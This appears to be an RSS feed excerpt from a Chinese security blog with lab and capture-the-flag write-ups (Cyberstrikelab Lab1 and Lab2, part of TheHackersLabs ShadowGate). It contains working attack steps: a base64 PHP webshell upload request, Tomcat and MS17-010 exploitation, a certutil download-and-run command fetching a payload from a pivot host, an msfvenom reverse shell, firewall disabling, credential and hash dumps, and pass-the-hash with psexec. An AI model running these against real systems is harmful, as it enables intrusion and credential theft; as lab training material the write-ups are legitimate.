192.168.10.10:7680 open
192.168.10.233:8080 open
192.168.10.10:808 open
192.168.10.20:8009 open
[*] alive ports len is: 13
start vulscan
[*] NetInfo 
[*]192.168.10.10
   [->]DESKTOP-JFB57A8
   [->]192.168.10.10
[*] WebTitle https://192.168.10.233:8080 code:404 len:19     title:None
[*] NetBios 192.168.10.20   cyberweb.cyberstrikelab.com         Windows Server 2012 R2 Standard 9600
[*] WebTitle http://192.168.10.20:8080 code:200 len:11432  title:Apache Tomcat/8.5.19
[*] WebTitle http://192.168.10.10:808  code:404 len:1331   title:系统发生错误
[+] PocScan http://192.168.10.20:8080 poc-yaml-iis-put-getshell 
[+] PocScan http://192.168.10.20:8080 poc-yaml-tomcat-cve-2017-12615-rce 
```

`192.168.10.20` 扫描出来两个洞

## 192.168.10.20

### cve-2017-12615

访问 `8080` 端口

![image.png](/post-images/CyberstrikelabLab2/image7.png)

之前在 `Fscan` 扫描出来 `cve-2017-12615`

> https://www.cnblogs.com/confidant/p/15440233.html
> 

![image.png](/post-images/CyberstrikelabLab2/image8.png)

连上冰蝎

![image.png](/post-images/CyberstrikelabLab2/image9.png)

### 提权

查看权限

```php
C:/Program Files/Apache Software Foundation/Tomcat 8.5/ >whoami /all

用户信息
----------------

用户名                       SID     
============================ ========
nt authority\network service S-1-5-20

组信息
-----------------

组名                                   类型   SID          属性                          
====================================== ====== ============ ==============================
Mandatory Label\System Mandatory Level 标签   S-1-16-16384                               
Everyone                               已知组 S-1-1-0      必需的组, 启用于默认, 启用的组
BUILTIN\Users                          别名   S-1-5-32-545 必需的组, 启用于默认, 启用的组
NT AUTHORITY\SERVICE                   已知组 S-1-5-6      必需的组, 启用于默认, 启用的组
CONSOLE LOGON                          已知组 S-1-2-1      必需的组, 启用于默认, 启用的组
NT AUTHORITY\Authenticated Users       已知组 S-1-5-11     必需的组, 启用于默认, 启用的组
NT AUTHORITY\This Organization         已知组 S-1-5-15     必需的组, 启用于默认, 启用的组
LOCAL                                  已知组 S-1-2-0      必需的组, 启用于默认, 启用的组

特权信息
----------------------

特权名                        描述                 状态  
============================= ==================== ======
SeAssignPrimaryTokenPrivilege 替换一个进程级令牌   已禁用
SeIncreaseQuotaPrivilege      为进程调整内存配额   已禁用
SeAuditPrivilege              生成安全审核         已禁用
SeChangeNotifyPrivilege       绕过遍历检查         已启用
SeImpersonatePrivilege        身份验证后模拟客户端 已启用
SeCreateGlobalPrivilege       创建全局对象         已启用
SeIncreaseWorkingSetPrivilege 增加进程工作集       已禁用
```

可以打 `SweetPotato` ，但是不知道为什么打不上，这里上线 `MSF` 来打

```php
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 172.16.233.2:4444 
[*] Sending stage (203846 bytes) to 192.168.10.20
[*] Meterpreter session 1 opened (172.16.233.2:4444 -> 192.168.10.20:49220) at 2025-08-12 20:22:41 +0800

meterpreter > getsystem
...got system via technique 4 (Named Pipe Impersonation (RPCSS variant)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

成功获得 `system` 权限

读第二个 `flag`

```php
C:\>type flag.txt
go-flag{2a1AygwfTuccnNJY}
```

### 信息收集

还有二层内网

![image.png](/post-images/CyberstrikelabLab2/image10.png)

上线 `Vshell` ，直接弹即可

![image.png](/post-images/CyberstrikelabLab2/image11.png)

`Fscan` 扫描发现 `192.168.20.30` 存在永恒之蓝，要走代理打

![image.png](/post-images/CyberstrikelabLab2/image12.png)

可以直接在 `Vshell` 上进行代理

选择 `192.168.10.20` 然后点击隧道代理

![image.png](/post-images/CyberstrikelabLab2/image13.png)

`Kali` 连接即可

```php
➜  Lab2 tail -n 1 /etc/proxychains4.conf
socks5  127.0.0.1       2131    admin   admin
➜  Lab2 proxychains curl 192.168.20.30:8080
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:2131  ...  192.168.20.30:8080  ...  OK
curl: (52) Empty reply from server
```

## 192.168.20.30

### 永恒之蓝

通过代理启动 `MSF`

```php
➜  Lab2 proxychains -q msfconsole                                                                                                                                      
Metasploit tip: The use command supports fuzzy searching to try and 
select the intended module, e.g. use kerberos/get_ticket or use 
kerberos forge silver ticket
                                                  
IIIIII    dTb.dTb        _.---._
  II     4'  v  'B   .'"".'/|\`.""'.
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'
IIIIII     'YvP'       `-.__|__.-'

I love shells --egypt

       =[ metasploit v6.4.69-dev                          ]
+ -- --=[ 2529 exploits - 1302 auxiliary - 432 post       ]
+ -- --=[ 1672 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > 
```

打 `command` 就好了，直接读 `flag`

```php
msf6 > search ms17
msf6 > use 19
msf6 auxiliary(admin/smb/ms17_010_command) > set command "type C:\flag.txt"
command => type C:\flag.txt
msf6 auxiliary(admin/smb/ms17_010_command) > set rhost 192.168.20.30
rhost => 192.168.20.30
```

![image.png](/post-images/CyberstrikelabLab2/image14.png)]]></content:encoded>
            <category>靶机</category>
            <category>Cyberstrikelab</category>
            <category>Windows</category>
            <category>Tomcat</category>
            <category>Vshell</category>
            <category>多层内网</category>
            <category>MS17_010</category>
        </item>
        <item>
            <title><![CDATA[Cyberstrikelab - Lab1]]></title>
            <link>https://www.sunsetaction.top/2025/08/12/CyberstrikelabLab-1</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/08/12/CyberstrikelabLab-1</guid>
            <pubDate>Tue, 12 Aug 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Lab 1 https://www.cyberstrikelab.com/#/scene/detail/20 Youcms youcms 网上能找到 youcms 前台 getshell 的利用 https://blog.csdn.net/qq 48985780/article/details/12...]]></description>
            <content:encoded><![CDATA[
# Lab-1

> https://www.cyberstrikelab.com/#/scene/detail/20
> 

## Youcms

`youcms`

![image.png](/post-images/CyberstrikelabLab-1/image.png)

网上能找到 `youcms` 前台 `getshell` 的利用

> https://blog.csdn.net/qq_48985780/article/details/121945304
> 

```php
POST /index.php/api/Uploadify/preview HTTP/1.1
Host: 192.168.10.10
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Upgrade-Insecure-Requests: 1
Priority: u=0, i
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0
Accept-Encoding: gzip, deflate
Sec-GPC: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded

data:image/php;base64,PD9waHAgcGhwaW5mbygpOw==
```

访问返回包中的 `preview/xxxxxxx.php`

![image.png](/post-images/CyberstrikelabLab-1/image1.png)

写入一句话木马

```php
POST /index.php/api/Uploadify/preview HTTP/1.1
Host: 192.168.10.10
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Upgrade-Insecure-Requests: 1
Priority: u=0, i
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0
Accept-Encoding: gzip, deflate
Sec-GPC: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Content-Type: application/x-www-form-urlencoded

data:image/php;base64,PD9waHAgc3lzdGVtKCRfUE9TVFsneCddKTs=
```

测试，是 `windows`

![image.png](/post-images/CyberstrikelabLab-1/image2.png)

## 192.168.10.10

进行反弹 `shell`

![image.png](/post-images/CyberstrikelabLab-1/image3.png)

![image.png](/post-images/CyberstrikelabLab-1/image4.png)

先把防火墙关了，然后开启远程桌面

```php
PS C:\phpstudy_pro\WWW\eyoucms1.0\preview> netsh advfirewall set allprofiles state off
Ok.

PS C:\phpstudy_pro\WWW\eyoucms1.0\preview> REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
The operation completed successfully.
```

之后再上线 `Vshell` ，使用一键上线命令即可

![image.png](/post-images/CyberstrikelabLab-1/image5.png)

`C` 盘根目录第一个 flag

```php
C:\>type flag.txt
go-flag{kn6anDUCzBqtjlX8}
```

这里为了方便所以上 `MSF` 抓了下 `HASH`

![image.png](/post-images/CyberstrikelabLab-1/image6.png)

这里可以使用 `evil-winrm` 进行登陆了

```php
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username       Domain           NTLM                              SHA1
--------       ------           ----                              ----
Administrator  WIN-KOHRC1DGOL9  a167976f7bd8d93ee232fa7a87a4079e  8b8bca113dee7e588272b1ca6b73b16d017d4434

wdigest credentials
===================

Username          Domain           Password
--------          ------           --------
(null)            (null)           (null)
Administrator     WIN-KOHRC1DGOL9  (null)
WIN-KOHRC1DGOL9$  WORKGROUP        (null)

kerberos credentials
====================

Username          Domain           Password
--------          ------           --------
(null)            (null)           (null)
Administrator     WIN-KOHRC1DGOL9  (null)
win-kohrc1dgol9$  WORKGROUP        (null)
```

`IP` 信息

```php
C:\>ipconfig

Windows IP 配置

以太网适配器 以太网 3:

   连接特定的 DNS 后缀 . . . . . . . :
   本地链接 IPv6 地址. . . . . . . . : fe80::f934:2031:ffb0:abe5%17
   IPv4 地址 . . . . . . . . . . . . : 192.168.10.10
   子网掩码  . . . . . . . . . . . . : 255.255.255.0
   默认网关. . . . . . . . . . . . . : 192.168.10.233

以太网适配器 以太网实例 0:

   连接特定的 DNS 后缀 . . . . . . . :
   本地链接 IPv6 地址. . . . . . . . : fe80::dd76:17c3:eada:75fb%16
   IPv4 地址 . . . . . . . . . . . . : 192.168.20.10
   子网掩码  . . . . . . . . . . . . : 255.255.255.0
   默认网关. . . . . . . . . . . . . : 192.168.20.1

隧道适配器 isatap.{4DA50EBB-5871-4387-AB71-FF1EF08A5B10}:

   媒体状态  . . . . . . . . . . . . : 媒体已断开
   连接特定的 DNS 后缀 . . . . . . . :

隧道适配器 isatap.{0A087C82-408A-4C20-8EB3-4E5C11A340D7}:

   媒体状态  . . . . . . . . . . . . : 媒体已断开
   连接特定的 DNS 后缀 . . . . . . . :
```

找到内网网段 `192.168.20.x`

上传 `fscan` 扫描

```php
PS C:\> ./fscan -h 192.168.20.1-255
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.0

[2025-08-12 07:42:18] [INFO] 暴力破解线程数: 1
[2025-08-12 07:42:18] [INFO] 开始信息扫描
[2025-08-12 07:42:18] [INFO] 生成IP范围: 192.168.20.1 - 192.168.20.255
[2025-08-12 07:42:18] [INFO] 最终有效主机数量: 255
[2025-08-12 07:42:18] [INFO] 开始主机扫描
[2025-08-12 07:42:18] [SUCCESS] 目标 192.168.20.10   存活 (ICMP)
[2025-08-12 07:42:19] [SUCCESS] 目标 192.168.20.20   存活 (ICMP)
[2025-08-12 07:42:19] [SUCCESS] 目标 192.168.20.30   存活 (ICMP)
[2025-08-12 07:42:21] [INFO] 存活主机数量: 3
[2025-08-12 07:42:21] [INFO] 有效端口数量: 233
[2025-08-12 07:42:21] [SUCCESS] 端口开放 192.168.20.30:135
[2025-08-12 07:42:21] [SUCCESS] 端口开放 192.168.20.20:135
[2025-08-12 07:42:21] [SUCCESS] 端口开放 192.168.20.10:135
[2025-08-12 07:42:21] [SUCCESS] 端口开放 192.168.20.30:88
[2025-08-12 07:42:21] [SUCCESS] 端口开放 192.168.20.10:80
[2025-08-12 07:42:23] [SUCCESS] 端口开放 192.168.20.30:445
[2025-08-12 07:42:23] [SUCCESS] 端口开放 192.168.20.20:445
[2025-08-12 07:42:23] [SUCCESS] 端口开放 192.168.20.10:445
[2025-08-12 07:42:23] [SUCCESS] 端口开放 192.168.20.30:389
[2025-08-12 07:42:23] [SUCCESS] 端口开放 192.168.20.30:139
[2025-08-12 07:42:23] [SUCCESS] 端口开放 192.168.20.20:139
[2025-08-12 07:42:23] [SUCCESS] 端口开放 192.168.20.10:139
[2025-08-12 07:42:26] [SUCCESS] 端口开放 192.168.20.10:3306
[2025-08-12 07:42:26] [SUCCESS] 服务识别 192.168.20.10:3306 => [mysql] 产品:MySQL 信息:unauthorized Banner:[H.j Host 'WIN-KOHRC1DGOL9' is not allowed
to connect to this MySQL server]
[2025-08-12 07:42:27] [SUCCESS] 服务识别 192.168.20.30:88 => 
[2025-08-12 07:42:30] [SUCCESS] 服务识别 192.168.20.10:80 => [http]
[2025-08-12 07:42:31] [SUCCESS] 服务识别 192.168.20.10:445 => 
[2025-08-12 07:42:31] [SUCCESS] 服务识别 192.168.20.10:139 =>  Banner:[.]
[2025-08-12 07:42:31] [SUCCESS] 服务识别 192.168.20.20:139 =>  Banner:[.]
[2025-08-12 07:42:31] [SUCCESS] 服务识别 192.168.20.30:445 => 
[2025-08-12 07:42:31] [SUCCESS] 服务识别 192.168.20.30:139 =>  Banner:[.]
[2025-08-12 07:42:31] [SUCCESS] 服务识别 192.168.20.20:445 => 
[2025-08-12 07:42:36] [SUCCESS] 服务识别 192.168.20.30:389 => 
[2025-08-12 07:43:27] [SUCCESS] 服务识别 192.168.20.30:135 => 
[2025-08-12 07:43:27] [SUCCESS] 服务识别 192.168.20.20:135 => 
[2025-08-12 07:43:27] [SUCCESS] 服务识别 192.168.20.10:135 => 
[2025-08-12 07:43:27] [INFO] 存活端口数量: 13
[2025-08-12 07:43:27] [INFO] 开始漏洞扫描
[2025-08-12 07:43:27] [INFO] 加载的插件: findnet, ldap, ms17010, mysql, netbios, smb, smb2, smbghost, webpoc, webtitle
[2025-08-12 07:43:27] [SUCCESS] NetInfo 扫描结果
目标主机: 192.168.20.10
主机名: WIN-KOHRC1DGOL9
发现的网络接口:
   IPv4地址:
      └─ 192.168.10.10
[2025-08-12 07:43:27] [SUCCESS] NetInfo 扫描结果
目标主机: 192.168.20.20
主机名: cyberweb
发现的网络接口:
   IPv4地址:
      └─ 192.168.20.20
[2025-08-12 07:43:27] [SUCCESS] 发现漏洞 192.168.20.20 [Windows Server 2012 R2 Standard 9600] MS17-010
[2025-08-12 07:43:27] [SUCCESS] NetBios 192.168.20.20   cyberweb.cyberstrikelab.com         Windows Server 2012 R2 Standard 9600
[2025-08-12 07:43:27] [SUCCESS] 发现漏洞 192.168.20.30 [Windows Server 2008 R2 Standard 7600] MS17-010
[2025-08-12 07:43:27] [SUCCESS] NetInfo 扫描结果
目标主机: 192.168.20.30
主机名: WIN-7NRTJO59O7N
发现的网络接口:
   IPv4地址:
      └─ 192.168.20.30
[2025-08-12 07:43:28] [SUCCESS] NetBios 192.168.20.10   WORKGROUP\WIN-KOHRC1DGOL9           Windows Server 2012 R2 Standard 9600
[2025-08-12 07:43:30] [SUCCESS] 网站标题 http://192.168.20.10      状态码:200 长度:25229  标题:易优CMS -  Powered by Eyoucms.com
[2025-08-12 07:43:40] [SUCCESS] 目标: http://192.168.20.10:80
  漏洞类型: poc-yaml-thinkphp5023-method-rce
  漏洞名称: poc1
  详细信息:
        links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce
```

`192.168.20.20` 和 `30` 发现永恒之蓝

## 192.168.20.20 - 1

打永恒之蓝需要搭代理

这里使用 `stowaway`

```php
./linux_x64_admin -l 8000 -s 123

Start-Process -FilePath "C:\agent.exe" -ArgumentList "-c 172.16.233.2:8000 -s 123 --reconnect 8"
```

```php
(admin) >> use 0
(node 0) >> socks 4444 admin admin
[*] Trying to listen on 0.0.0.0:4444......
[*] Waiting for agent's response......
[*] Socks start successfully!
```

设置好代理后用 `MSF` 打永恒之蓝

```php
➜  Lab1 proxychains -q msfconsole
search ms17_010
use 19
set command whoami
set rhost 192.168.20.20
run
```

但是这里应该是被修复了，先放着

```php
msf6 auxiliary(admin/smb/ms17_010_command) > exploit

[*] 192.168.20.20:445     - Target OS: Windows Server 2012 R2 Standard 9600
[-] 192.168.20.20:445     - Unable to find accessible named pipe!
[*] 192.168.20.20:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## 192.168.20.30

转换目标，打 `192.168.20.30`

```php
msf6 auxiliary(admin/smb/ms17_010_command) > set rhost 192.168.20.30
rhost => 192.168.20.30
msf6 auxiliary(admin/smb/ms17_010_command) > set command whoami
command => whoami
msf6 auxiliary(admin/smb/ms17_010_command) > run
[*] 192.168.20.30:445     - Target OS: Windows Server 2008 R2 Standard 7600
[*] 192.168.20.30:445     - Built a write-what-where primitive...
[+] 192.168.20.30:445     - Overwrite complete... SYSTEM session obtained!
[+] 192.168.20.30:445     - Service start timed out, OK if running a command or non-service executable...
[*] 192.168.20.30:445     - Getting the command output...
[*] 192.168.20.30:445     - Executing cleanup...
[+] 192.168.20.30:445     - Cleanup was successful
[+] 192.168.20.30:445     - Command completed successfully!
[*] 192.168.20.30:445     - Output for "whoami":

nt authority\system

[*] 192.168.20.30:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

成功执行，准备上线 `Vshell` 

通过 `stowaway` 将监听端口映射到 `192.168.20.10`

```php
(node 0) >> backward 1234 1234
[*] Trying to ask node to listen on 0.0.0.0:1234......
[*] Waiting for agent's response......
[*] Backward start successfully!
```

通过 `ms17_010` 进行上线

```php
set command "certutil.exe -urlcache -split -f http://192.168.20.10:1234/swt C:\\run.bat"
run
set command "start C:\\run.bat"
run
```

![image.png](/post-images/CyberstrikelabLab-1/image7.png)

`C` 盘根目录能找到第二个 `flag`

```php
go-flag{R0M4QwsS6EQp97lw}
```

关闭防火墙和开启远程桌面

```php
C:\Windows\system32>netsh advfirewall set allprofiles state off
确定。

C:\Windows\system32>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
操作成功完成。
```

信息收集，发现该机器就是 DC

```php
C:\Windows\system32>net view
服务器名称            注解

-------------------------------------------------------------------------------
\\CYBERWEB
\\WIN-7NRTJO59O7N
命令成功完成。

PS C:\> net view /domain
Domain

-------------------------------------------------------------------------------
CYBERSTRIKELAB
命令成功完成。

C:\Windows\system32>net view /domain
Domain

-------------------------------------------------------------------------------
CYBERSTRIKELAB
命令成功完成。

C:\Windows\system32>net group "domain controllers"
组名     Domain Controllers
注释     域中所有域控制器

成员

-------------------------------------------------------------------------------
WIN-7NRTJO59O7N$
```

上线 `MSF` ，和上面上线 `Vshell`的操作类似

```php
(node 0) >> backward 9009 9009
[*] Trying to ask node to listen on 0.0.0.0:9009......
[*] Waiting for agent's response......
[*] Backward start successfully!
```

```php
msf6 exploit(multi/handler) > set lport 9009
lport => 9009
msf6 exploit(multi/handler) > options

Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     0.0.0.0          yes       The listen address (an interface may be specified)
   LPORT     9009             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 0.0.0.0:9009 
```

```php
➜  Lab1 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.20.10 LPORT=9009 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
```

将 `shell.exe` 上传到 `192.168.20.30` ，然后运行

![image.png](/post-images/CyberstrikelabLab-1/image8.png)

抓取 `hash`

```php
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:94bd5248e87cb7f2f9b871d40c903927:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5bc02b7670084dd30471730cc0a1672c:::
cyberweb:1105:aad3b435b51404eeaad3b435b51404ee:2de5cd0f15d1c070851d1044e1d95c90:::
WIN-7NRTJO59O7N$:1000:aad3b435b51404eeaad3b435b51404ee:f056ff4d1ad036e570c5344bb3d4e65c:::
CYBERWEB$:1103:aad3b435b51404eeaad3b435b51404ee:c9f108dc7ba78e084283c00e33dffeff:::
```

## 192.168.20.20

测试凭据

```php
➜  Lab1 proxychains -q nxc smb 192.168.20.20 -u administrator -H 94bd5248e87cb7f2f9b871d40c903927 
SMB         192.168.20.20   445    CYBERWEB         [*] Windows 8.1 / Server 2012 R2 Build 9600 x64 (name:CYBERWEB) (domain:cyberstrikelab.com) (signing:False) (SMBv1:True) 
SMB         192.168.20.20   445    CYBERWEB         [+] cyberstrikelab.com\administrator:94bd5248e87cb7f2f9b871d40c903927 (Pwn3d!)
```

`PTH` 拿下

```php
➜  Lab1 proxychains -q psexec.py cyberstrikelab.com/administrator@cyberweb.cyberstrikelab.com -hashes aad3b435b51404eeaad3b435b51404ee:94bd5248e87cb7f2f9b871d40c903927
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on cyberweb.cyberstrikelab.com.....
[*] Found writable share ADMIN$
[*] Uploading file pqpIKIBX.exe
[*] Opening SVCManager on cyberweb.cyberstrikelab.com.....
[*] Creating service WhKD on cyberweb.cyberstrikelab.com.....
[*] Starting service WhKD.....
[!] Press help for extra shell commands
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
Microsoft Windows [�汾 6.3.9600]

[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
(c) 2013 Microsoft Corporation����������Ȩ����

C:\Windows\system32>
```

读取第三个 `flag`

```php
C:\> type flag.txt
go-flag{Nb8VOT8X9SbIzyDI}
```]]></content:encoded>
            <category>靶机</category>
            <category>Cyberstrikelab</category>
            <category>Windows</category>
            <category>Vshell</category>
            <category>多层内网</category>
            <category>MS17_010</category>
        </item>
        <item>
            <title><![CDATA[TheHackersLabs - ShadowGate]]></title>
            <link>https://www.sunsetaction.top/2025/08/06/TheHackersLabsShadowGate</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/08/06/TheHackersLabsShadowGate</guid>
            <pubDate>Wed, 06 Aug 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[ShadowGate https://labs.thehackerslabs.com/machine/97 Recon PortScan 枚举 8080 端口 提示错误的方法，但是你找到路径了 改为 POST 方法后提示 没有任何信息，看一下其他端口 奇怪的 56789 端口，nc 试一下 暗影之门...]]></description>
            <content:encoded><![CDATA[
# ShadowGate

> https://labs.thehackerslabs.com/machine/97
> 

![image.png](/post-images/TheHackersLabsShadowGate/image.png)

## Recon

### PortScan

```bash
➜  ShadowGate nmap -sT -min-rate 10000 -p- 192.168.56.105
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 21:20 CST
Nmap scan report for 192.168.56.105
Host is up (0.00050s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
8080/tcp  open  http-proxy
56789/tcp open  unknown
MAC Address: 08:00:27:B2:61:F3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 16.41 seconds
```

```bash
➜  ShadowGate nmap -sT -A -p 22,8080,56789 192.168.56.105
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-05 21:21 CST
Nmap scan report for 192.168.56.105
Host is up (0.00047s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 84:05:fe:ed:47:16:ab:28:70:0f:44:6e:f6:8d:0c:6f (ECDSA)
|_  256 99:a9:88:76:ee:c8:ed:ce:73:57:2a:22:da:9f:7b:7e (ED25519)
8080/tcp  open  http       Werkzeug httpd 3.1.3 (Python 3.12.3)
|_http-title: 403 Forbidden
|_http-server-header: Werkzeug/3.1.3 Python/3.12.3
56789/tcp open  tcpwrapped
MAC Address: 08:00:27:B2:61:F3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.47 ms 192.168.56.105

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.07 seconds
```

### 枚举

 `8080` 端口

提示错误的方法，但是你找到路径了

![Snipaste_2025-08-05_21-30-52.png](/post-images/TheHackersLabsShadowGate/Snipaste_2025-08-05_21-30-52.png)

改为 `POST` 方法后提示

![image.png](/post-images/TheHackersLabsShadowGate/image1.png)

没有任何信息，看一下其他端口

奇怪的 `56789` 端口，`nc` 试一下

```bash
➜  ShadowGate nc 192.168.56.105 56789                 
Shadow Gate v1.0 :: Not all doors are locked. Some wait for n0cturne. Listen closely—patterns hide in the noise. Sequence always matters.
Listening... but no response.
```

> 暗影之门 v1.0 :: 并非所有门都锁着。有些门在等待夜幕降临。仔细聆听——噪音中隐藏着规律。顺序总是很重要。
聆听……但没有回应。
> 

看着像是要向里边按顺序输入一下东西

## 56789

当我们输入 `n0cturne` 时，会出现好几串 `base64` 加密后的字符

![image.png](/post-images/TheHackersLabsShadowGate/image2.png)

并且重新输入生成的还是不一样的

![image.png](/post-images/TheHackersLabsShadowGate/image3.png)

根据特征，解密后得到 16字节 = 128位。这是现代分组密码（如 `AES-128`）最常见的块大小（Block Size）

```bash
// 第一次生成
YzRmN2QzNQ==
MwaB7TbchXxNQQwID9JXIg==
7+ptCEtXTcCFo8dVwYrIEw==
YAgEH6bP+PPY4VyD80z7sg==
a+T5dxugIDfFykgQi71Eag==
fGMHS36e74T+cALZURlj8g==
ez4fog9UnAeemGETp6K2Aw==
XZSJq2YIk3v/GM9R/NPa9w==
sh6KfrTKDXndFadgySlIhA==

// 第二次生成
YzRmN2QzNQ==
5/moJpOc9OpfYOHR6jl+bA==
GWxuKkuzPn0t4aTSO0livQ==
E2QIRlxnY+gWfTlVUcm4LA==
Yu9ChnO4fJxbMPPGbN04ug==
NdNO8rDcGcLah47kqmnKBA==
gFpBAQKKx1QDMNw60GkiwA==
4eL9754ZX/qQYUk4s6Q9SA==
Mxte5TYR9OIZuzOmQDWAYg==
```

第一行解码为：`YzRmN2QzNQ==` >`c4f7d35`

这里因为我对密码学不熟，查阅了一下 `WP`

第一串编码应该是密钥

```bash
(more) ➜  ShadowGate echo -n "c4f7d35" | sha256sum
7c4aedf4c9394cf4f128c343b75b442eed08c5d51dbed97b9a1fadc0441a7b75  -
```

然后在 `cyberchef` 进行解密，因为我们不知道 `IV` 以及加密模式，我们都可以进行测试一下，最后可以使用 `ECB/NoPadding` 进行解密

解密第一次的密文

![image.png](/post-images/TheHackersLabsShadowGate/image4.png)

解密第二次的密文

![image.png](/post-images/TheHackersLabsShadowGate/image5.png)

可以发现每一段密文的第一个字符都是一样的，能拿到 `v4u1tgx9`

## 8080

拿到 `v4u1tgx9` 之后，我们应该可以对 `8080` 进行测试了

输入 `username`

![image.png](/post-images/TheHackersLabsShadowGate/image6.png)

> 令牌已派出。你只需要……侧身看。
> 

提示缺少 `Token` ，并且还看到相应保中带有 `MFA`（双重认证），是基于时间生成的 `TOTP` 一次性口令，无法直接爆破

对目录进行爆破，尝试寻找更多接口

```bash
➜  ShadowGate ffuf -u 'http://192.168.56.105:8080/FUZZ' -w /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt -fc 404,403 -X POST -H 'Content-Type: application/x-www-form-urlencoded'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://192.168.56.105:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/fuzzDicts/paramDict/AllParam.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404,403
________________________________________________

login                   [Status: 200, Size: 48, Words: 8, Lines: 1, Duration: 72ms]
verify                  [Status: 200, Size: 21, Words: 3, Lines: 1, Duration: 85ms]
```

找到 `verify` 的端点，进行测试，所以 `login`是第一层认证，`verify` 是第二层认证

将第一层的响应中的 `X-Shadow-MFA: 286346` 放到 `verify`中

![image.png](/post-images/TheHackersLabsShadowGate/image7.png)

添加后提示：” 承认。主动服务。“

![image.png](/post-images/TheHackersLabsShadowGate/image8.png)

回到 `56789`端口，原本的行为会被改变

